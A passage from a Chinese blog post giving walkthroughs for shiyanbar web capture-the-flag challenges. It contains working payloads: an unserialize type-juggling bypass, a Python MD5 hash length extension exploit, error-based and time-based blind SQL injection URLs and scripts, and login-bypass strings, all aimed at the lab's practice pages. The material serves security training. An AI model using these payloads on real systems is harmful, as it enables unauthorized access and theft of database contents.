+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!empty(<span class="variable">$token</span>)&amp;&amp;!empty(<span class="variable">$emailAddress</span>))&#123;</span><br><span class="line">	<span class="keyword">if</span>(strlen(<span class="variable">$token</span>)!=10) die(<span class="string">'fail'</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$token</span>!=<span class="string">'0'</span>) die(<span class="string">'fail'</span>);</span><br><span class="line">	<span class="variable">$sql</span> = <span class="string">"SELECT count(*) as num from `user` where token='<span class="variable">$token</span>' AND email='<span class="variable">$emailAddress</span>'"</span>;</span><br><span class="line">	<span class="variable">$r</span> = mysql_query(<span class="variable">$sql</span>) or die(<span class="string">'db error'</span>);</span><br><span class="line">	<span class="variable">$r</span> = mysql_fetch_assoc(<span class="variable">$r</span>);</span><br><span class="line">	<span class="variable">$r</span> = <span class="variable">$r</span>[<span class="string">'num'</span>];</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$r</span>&gt;0)&#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="built_in">echo</span> <span class="string">"失败了呀"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>token要等于0而且长度要等于10    0000000000</p>
+<p><img src="15-7.png" alt=""></p>
+<h2 id="天网管理系统"><a href="#天网管理系统" class="headerlink" title="天网管理系统"></a>天网管理系统</h2><p><img src="16-1.png" alt=""></p>
+<p><img src="16-2.png" alt=""></p>
+<p>输入username=QNKCDZO</p>
+<p><img src="16-3.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$unserialize_str</span> = <span class="variable">$_POST</span>[<span class="string">'password'</span>];</span><br><span class="line">     <span class="variable">$data_unserialize</span> = unserialize(<span class="variable">$unserialize_str</span>);</span><br><span class="line">     <span class="keyword">if</span>(<span class="variable">$data_unserialize</span>[<span class="string">'user'</span>] == <span class="string">'???'</span> &amp;&amp; <span class="variable">$data_unserialize</span>[<span class="string">'pass'</span>]==<span class="string">'???'</span>)</span><br><span class="line">     &#123;</span><br><span class="line">       print_r(<span class="variable">$flag</span>);</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure>
+<p>伟大的科学家php方言道：成也布尔，败也布尔。<br>回去吧骚年</p>
+<p>分析：<br>　　代码意思是把post提交的password值经过”反序列化”得到一个数组，要求数组里的user和pass都等于某个值时就打印flag。<br>　　但是我们不知道两处???到底是什么，因此无法考虑用php函数构造这样的值。<br>　　别忘了还有一个提示： “伟大的科学家php方言道：成也布尔，败也布尔” ，bool类型的true跟任意字符串可以弱类型相等。因此我们可以构造bool类型的序列化数据 ，无论比较的值是什么，结果都为true。（a代表array，s代表string，b代表bool，而数字代表个数/长度）<br>　　构造password值为：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:2:&#123;s:4:<span class="string">"user"</span>;b:1;s:4:<span class="string">"pass"</span>;b:1;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>　　在密码栏中提交构造的值，即可获取flag: ctf{dwduwkhduw5465}</p>
+<p><img src="16-4.png" alt=""></p>
+<h2 id="Forms"><a href="#Forms" class="headerlink" title="Forms"></a>Forms</h2><p><img src="17-1.png" alt=""></p>
+<p><img src="17-2.png" alt=""></p>
+<p><img src="17-3.png" alt=""></p>
+<p><img src="17-4.png" alt=""></p>
+<h2 id="拐弯抹角"><a href="#拐弯抹角" class="headerlink" title="拐弯抹角"></a>拐弯抹角</h2><p><img src="18-1.png" alt=""></p>
+<p>应该是题目出了问题，直接访问index.php得到flag</p>
+<p><img src="18-2.png" alt=""></p>
+<h2 id="让我进去"><a href="#让我进去" class="headerlink" title="让我进去"></a>让我进去</h2><p><img src="19-1.png" alt=""></p>
+<p><img src="19-2.png" alt=""></p>
+<p>源代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$flag</span> = <span class="string">"XXXXXXXXXXXXXXXXXXXXXXX"</span>;</span><br><span class="line"><span class="variable">$secret</span> = <span class="string">"XXXXXXXXXXXXXXX"</span>; // This secret is 15 characters long <span class="keyword">for</span> security!</span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">"username"</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">"password"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!empty(<span class="variable">$_COOKIE</span>[<span class="string">"getmein"</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (urldecode(<span class="variable">$username</span>) === <span class="string">"admin"</span> &amp;&amp; urldecode(<span class="variable">$password</span>) != <span class="string">"admin"</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$COOKIE</span>[<span class="string">"getmein"</span>] === md5(<span class="variable">$secret</span> . urldecode(<span class="variable">$username</span> . <span class="variable">$password</span>))) &#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">"Congratulations! You are a registered user.\n"</span>;</span><br><span class="line">            die (<span class="string">"The flag is "</span>. <span class="variable">$flag</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            die (<span class="string">"Your cookies don't match up! STOP HACKING THIS SITE."</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        die (<span class="string">"You are not an admin! LEAVE."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">setcookie(<span class="string">"sample-hash"</span>, md5(<span class="variable">$secret</span> . urldecode(<span class="string">"admin"</span> . <span class="string">"admin"</span>)), time() + (60 * 60 * 24 * 7));</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (empty(<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>])) &#123;</span><br><span class="line">    setcookie(<span class="string">"source"</span>, 0, time() + (60 * 60 * 24 * 7));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_COOKIE</span>[<span class="string">"source"</span>] != 0) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="string">""</span>; // This <span class="built_in">source</span> code is outputted here</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>hash长度扩展攻击<br>代码：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">''</span><span class="string">'</span></span><br><span class="line"><span class="string">samplehash='</span>571580b26c65f306376d4f64e53cb5c7<span class="string">'</span></span><br><span class="line"><span class="string">s1='</span>0x<span class="string">'+samplehash[6:8]+samplehash[4:6]+samplehash[2:4]+samplehash[0:2]</span></span><br><span class="line"><span class="string">s2='</span>0x<span class="string">'+samplehash[14:16]+samplehash[12:14]+samplehash[10:12]+samplehash[8:10]</span></span><br><span class="line"><span class="string">s3='</span>0x<span class="string">'+samplehash[22:24]+samplehash[20:22]+samplehash[18:20]+samplehash[16:18]</span></span><br><span class="line"><span class="string">s4='</span>0x<span class="string">'+samplehash[30:32]+samplehash[28:30]+samplehash[26:28]+samplehash[24:26]</span></span><br><span class="line"><span class="string">print s1,'</span>\n<span class="string">',s2,'</span>\n<span class="string">',s3,'</span>\n<span class="string">',s4</span></span><br><span class="line"><span class="string">'</span><span class="string">''</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author：DshtAnger</span></span><br><span class="line">import my_md5</span><br><span class="line"><span class="comment">#reference:</span></span><br><span class="line"><span class="comment">#   http://www.freebuf.com/articles/web/69264.html</span></span><br><span class="line"><span class="comment">#problem link:</span></span><br><span class="line"><span class="comment">#   http://ctf4.shiyanbar.com/web/kzhan.php</span></span><br><span class="line"></span><br><span class="line">samplehash=<span class="string">"571580b26c65f306376d4f64e53cb5c7"</span></span><br><span class="line"><span class="comment">#将哈希值分为四段,并反转该四字节为小端序,作为64第二次循环的输入幻书</span></span><br><span class="line">s1=0xb2801557</span><br><span class="line">s2=0x06f3656c</span><br><span class="line">s3=0x644f6d37</span><br><span class="line">s4=0xc7b53ce5</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">type</span>(s1)</span><br><span class="line"><span class="comment">#exp</span></span><br><span class="line">secret = <span class="string">"a"</span>*15</span><br><span class="line">secret_admin = secret+<span class="string">'adminadmin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00admin'</span></span><br><span class="line">r = my_md5.deal_rawInputMsg(secret_admin)</span><br><span class="line">inp = r[len(r)/2:]</span><br><span class="line"><span class="built_in">print</span> <span class="string">"getmein:"</span>+my_md5.run_md5(s1,s2,s3,s4,inp)</span><br><span class="line"></span><br><span class="line">得到：getmein:e18dfd8404515016d3aeeea2aa196909</span><br></pre></td></tr></table></figure></p>
+<p>burp抓包改包<br>username=admin<br>password=admin+\x80\x00……admin<br>\x80\x00要在hex里面修改</p>
+<p><img src="19-3.png" alt=""></p>
+<p><img src="19-4.png" alt=""></p>
+<p>或者用<br>username=admin&amp;password=admin%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%c8%00%00%00%00%00%00%00admin</p>
+<p><img src="19-5.png" alt=""></p>
+<h2 id="天下武功唯快不破"><a href="#天下武功唯快不破" class="headerlink" title="天下武功唯快不破"></a>天下武功唯快不破</h2><p><img src="20-1.png" alt=""></p>
+<p><img src="20-2.png" alt=""></p>
+<p><img src="20-3.png" alt=""></p>
+<p>python 代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests,re</span><br><span class="line">from base64 import b64decode</span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">'http://ctf5.shiyanbar.com/web/10/10.php'</span></span><br><span class="line">r = s.get(url)</span><br><span class="line">head = r.headers</span><br><span class="line">flag = b64decode(head[<span class="string">'flag'</span>]).split(<span class="string">':'</span>)[1]</span><br><span class="line">r1 = s.post(url, data=&#123;<span class="string">'key'</span>:flag&#125;)</span><br><span class="line"><span class="built_in">print</span> r1.text</span><br></pre></td></tr></table></figure></p>
+<h2 id="简单的sql注入"><a href="#简单的sql注入" class="headerlink" title="简单的sql注入"></a>简单的sql注入</h2><p><img src="21-1.png" alt=""></p>
+<p>双写绕过加上空格过滤</p>
+<p><img src="21-2.png" alt=""></p>
+<h2 id="简单的sql注入之2"><a href="#简单的sql注入之2" class="headerlink" title="简单的sql注入之2"></a>简单的sql注入之2</h2><p><img src="22-1.png" alt=""></p>
+<p><img src="22-2.png" alt=""></p>
+<h2 id="简单的sql注入之3"><a href="#简单的sql注入之3" class="headerlink" title="简单的sql注入之3"></a>简单的sql注入之3</h2><p><img src="23-1.png" alt=""></p>
+<p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>‘ and exp(~(select * FROM(SELECT database())a))–+</p>
+<p><img src="23-2.png" alt=""></p>
+<p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>‘ and exp(~(select * FROM(select group_concat(table_name) from information_schema.tables where table_schema=’web1’)a))–+</p>
+<p><img src="23-3.png" alt=""></p>
+<p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>‘ and exp(~(select * FROM(select group_concat(column_name) from information_schema.columns where table_name=’flag’ )a))–+</p>
+<p><img src="23-4.png" alt=""></p>
+<p><a href="http://ctf5.shiyanbar.com/web/index_3.php?id=1" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/index_3.php?id=1</a>‘ and exp(~(select * FROM(select flag from flag)a))–+</p>
+<p><img src="23-5.png" alt=""></p>
+<h2 id="因缺思汀的绕过"><a href="#因缺思汀的绕过" class="headerlink" title="因缺思汀的绕过"></a>因缺思汀的绕过</h2><p><img src="24-1.png" alt=""></p>
+<p><img src="24-2.png" alt=""></p>
+<p><img src="24-3.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!isset(<span class="variable">$_POST</span>[<span class="string">'uname'</span>]) || !isset(<span class="variable">$_POST</span>[<span class="string">'pwd'</span>])) &#123;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;form action="" method="post"&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="uname" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input name="pwd" type="text"/&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;input type="submit" /&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;/form&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">	<span class="built_in">echo</span> <span class="string">'&lt;!--source: source.txt--&gt;'</span>.<span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> AttackFilter(<span class="variable">$StrKey</span>,<span class="variable">$StrValue</span>,<span class="variable">$ArrReq</span>)&#123;  </span><br><span class="line">    <span class="keyword">if</span> (is_array(<span class="variable">$StrValue</span>))&#123;</span><br><span class="line">        <span class="variable">$StrValue</span>=implode(<span class="variable">$StrValue</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">"/"</span>.<span class="variable">$ArrReq</span>.<span class="string">"/is"</span>,<span class="variable">$StrValue</span>)==1)&#123;   </span><br><span class="line">        <span class="built_in">print</span> <span class="string">"水可载舟，亦可赛艇！"</span>;</span><br><span class="line">        <span class="built_in">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$filter</span> = <span class="string">"and|select|from|where|union|join|sleep|benchmark|,|\(|\)"</span>;</span><br><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$key</span>=&gt;<span class="variable">$value</span>)&#123; </span><br><span class="line">    AttackFilter(<span class="variable">$key</span>,<span class="variable">$value</span>,<span class="variable">$filter</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$con</span> = mysql_connect(<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>,<span class="string">"XXXXXX"</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$con</span>)&#123;</span><br><span class="line">	die(<span class="string">'Could not connect: '</span> . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$db</span>=<span class="string">"XXXXXX"</span>;</span><br><span class="line">mysql_select_db(<span class="variable">$db</span>, <span class="variable">$con</span>);</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">"SELECT * FROM interest WHERE uname = '&#123;<span class="variable">$_POST</span>['uname']&#125;'"</span>;</span><br><span class="line"><span class="variable">$query</span> = mysql_query(<span class="variable">$sql</span>); </span><br><span class="line"><span class="keyword">if</span> (mysql_num_rows(<span class="variable">$query</span>) == 1) &#123; </span><br><span class="line">    <span class="variable">$key</span> = mysql_fetch_array(<span class="variable">$query</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>[<span class="string">'pwd'</span>] == <span class="variable">$_POST</span>[<span class="string">'pwd'</span>]) &#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"CTF&#123;XXXXXX&#125;"</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">print</span> <span class="string">"亦可赛艇！"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="built_in">print</span> <span class="string">"一颗赛艇！"</span>;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close(<span class="variable">$con</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>这里的思路是，利用group by pwd with rollup在查询中的一个特点，他可以返回pwd所在的那一条记录，通过limit控制返回哪一条，因此他不可以返回多条，一旦返回2条及以上，pwd就会为空，但同一条记录中的其他字段则是正常的</p>
+<p>那么利用这一点令查询结果为空，我们输入的pwd也为空值，则构成了if(null==null)为true<br>即：输入的用户名为：’ or 1=1 group by pwd with rollup limit 1 offset 2 #<br>这里解释一下此时执行的SQL:<br>SELECT * FROM interest where uname=’ ‘ or 1=1<br>group by pwd with rollup  （在数据库中添加一行使得pwd=NULL）<br>limit 1 （只查询一行）<br>offset 2  （从第二行开始查询）</p>
+<p>#注释<br>此时密码只要为空即可查询成功 </p>
+<p><img src="24-4.png" alt=""></p>
+<h2 id="who-are-you"><a href="#who-are-you" class="headerlink" title="who are you?"></a>who are you?</h2><p><img src="25-1.png" alt=""></p>
+<p><img src="25-2.png" alt=""></p>
+<p><img src="25-3.png" alt=""></p>
+<p>发现逗号之后内容的都截断了</p>
+<p><img src="25-4.png" alt=""></p>
+<p>尝试xff注入<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url=<span class="string">"http://ctf5.shiyanbar.com/web/wonderkun/index.php"</span></span><br><span class="line">allString=string.lowercase + string.uppercase + string.digits</span><br><span class="line">flag=<span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(1,33):</span><br><span class="line">    <span class="keyword">for</span> str1 <span class="keyword">in</span> allString:</span><br><span class="line">        data=<span class="string">"11'+(select case when (substring((select flag from flag ) from &#123;0&#125; for 1 )='&#123;1&#125;') then sleep(4) else 1 end ) and '1'='1"</span>.format(str(i),str1)</span><br><span class="line">        headers=&#123;<span class="string">"x-forwarded-for"</span>:data&#125;</span><br><span class="line">        try:</span><br><span class="line">            res=requests.get(url,headers=headers,timeout=3)</span><br><span class="line">        except requests.exceptions.ReadTimeout, e:</span><br><span class="line">            flag += str1</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">'flag:'</span> + flag</span><br></pre></td></tr></table></figure></p>
+<p>即可跑出</p>
+<p><img src="25-5.png" alt=""></p>
+<h2 id="登陆一下好吗"><a href="#登陆一下好吗" class="headerlink" title="登陆一下好吗??"></a>登陆一下好吗??</h2><p><img src="26-1.png" alt=""></p>
+<p><img src="26-2.png" alt=""></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=’\<span class="variable">$_POST</span>[‘user’]’ and password=’\<span class="variable">$_POST</span>[‘password’]’”;</span><br><span class="line">输入username= <span class="string">'='</span>   password= <span class="string">'='</span></span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> user=<span class="string">''</span>=<span class="string">''</span> and password=<span class="string">''</span>=<span class="string">''</span> </span><br><span class="line">user=”返回的是NULL=”也是符合条件的，最后就是</span><br><span class="line"><span class="variable">$sql</span> = “select user from flag <span class="built_in">where</span> 1 and 1”;</span><br></pre></td></tr></table></figure>
+<p><img src="26-3.png" alt=""></p>
+
+      
+      
+        <div class="page-reward">
+          <p><a href="javascript:void(0)" onclick="dashangToggle()" class="dashang">赏</a></p>
+          <div class="hide_box"></div>
+          <div class="shang_box">
+            <a class="shang_close" href="javascript:void(0)" onclick="dashangToggle()">×</a>
+            <div class="shang_tit">
+              <p>纯属好玩</p>
+            </div>
+            <div class="shang_payimg">
+              <img src="/img/alipayimg.jpg" alt="扫码支持" title="扫一扫" />
+            </div>
+              <div class="pay_explain">打赏多少您随意！</div>
+            <div class="shang_payselect">
+              
+                <div class="pay_item checked" data-id="alipay">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/alipay.png" alt="支付宝" /></span>
+                </div>
+              
+              
+                <div class="pay_item" data-id="wechat">
+                  <span class="radiobox"></span>
+                  <span class="pay_logo"><img src="/img/weixin.png" alt="微信" /></span>
+                </div>
+              
+            </div>
+            <div class="shang_info">
+              <p>打开<span id="shang_pay_txt">支付宝</span>扫一扫，即可进行扫码打赏哦</p>
+            </div>
+          </div>
+        </div>
+        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/zepto/1.2.0/zepto.min.js"></script>
+        <script type="text/javascript">
+          $(".pay_item").click(function(){
+            $(this).addClass('checked').siblings('.pay_item').removeClass('checked');
+            var dataid=$(this).attr('data-id');
+            $(".shang_payimg img").attr("src","/img/"+dataid+"img.jpg");
+            $("#shang_pay_txt").text(dataid=="alipay"?"支付宝":"微信");
+          });
+          function dashangToggle(){
+            
+            $(".hide_box").fadeToggle();
+            $(".shang_box").fadeToggle();
+          }
+        </script>
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a href="/2018/02/01/西普实验吧-web/">西普实验吧-web</a></p>
+        <p><span>文章作者:</span><a href="/" title="访问 Archimesan 的个人博客">Archimesan</a></p>
+        <p><span>发布时间:</span>2018年02月01日 - 17时19分</p>
+        <p><span>最后更新:</span>2018年02月02日 - 15时56分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2018/02/01/西普实验吧-web/" title="西普实验吧-web">http://archimesan.me/2018/02/01/西普实验吧-web/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://archimesan.me/2018/02/01/西普实验吧-web/　　作者: Archimesan" title="点击复制文章链接"><i class="fa fa-clipboard"></i></span>
+            <script src="/js/clipboard.min.js"></script>
+            <script> var clipboard = new Clipboard('.copy-path'); </script>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a href="/2018/01/30/西普实验吧-密码学/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">西普实验室—-密码学</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#看起来有点难"><span class="toc-number">1.</span> <span class="toc-text">看起来有点难</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#猫抓老鼠"><span class="toc-number">2.</span> <span class="toc-text">猫抓老鼠</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forbidden"><span class="toc-number">3.</span> <span class="toc-text">Forbidden</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#头有点大"><span class="toc-number">4.</span> <span class="toc-text">头有点大</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#貌似有点难"><span class="toc-number">5.</span> <span class="toc-text">貌似有点难</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#这个看起来有点简单"><span class="toc-number">6.</span> <span class="toc-text">这个看起来有点简单!</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP大法"><span class="toc-number">7.</span> <span class="toc-text">PHP大法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#what-a-fuck-这是什么鬼东西"><span class="toc-number">8.</span> <span class="toc-text">what a fuck!这是什么鬼东西?</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#程序逻辑问题"><span class="toc-number">9.</span> <span class="toc-text">程序逻辑问题</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NSCTF-web200"><span class="toc-number">10.</span> <span class="toc-text">NSCTF web200</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#上传绕过"><span class="toc-number">11.</span> <span class="toc-text">上传绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#FALSE"><span class="toc-number">12.</span> <span class="toc-text">FALSE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Guess-Next-Session"><span class="toc-number">13.</span> <span class="toc-text">Guess Next Session</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Once-More"><span class="toc-number">14.</span> <span class="toc-text">Once More</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#忘记密码了"><span class="toc-number">15.</span> <span class="toc-text">忘记密码了</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#天网管理系统"><span class="toc-number">16.</span> <span class="toc-text">天网管理系统</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Forms"><span class="toc-number">17.</span> <span class="toc-text">Forms</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#拐弯抹角"><span class="toc-number">18.</span> <span class="toc-text">拐弯抹角</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#让我进去"><span class="toc-number">19.</span> <span class="toc-text">让我进去</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#天下武功唯快不破"><span class="toc-number">20.</span> <span class="toc-text">天下武功唯快不破</span></a></li><li class="toc-item 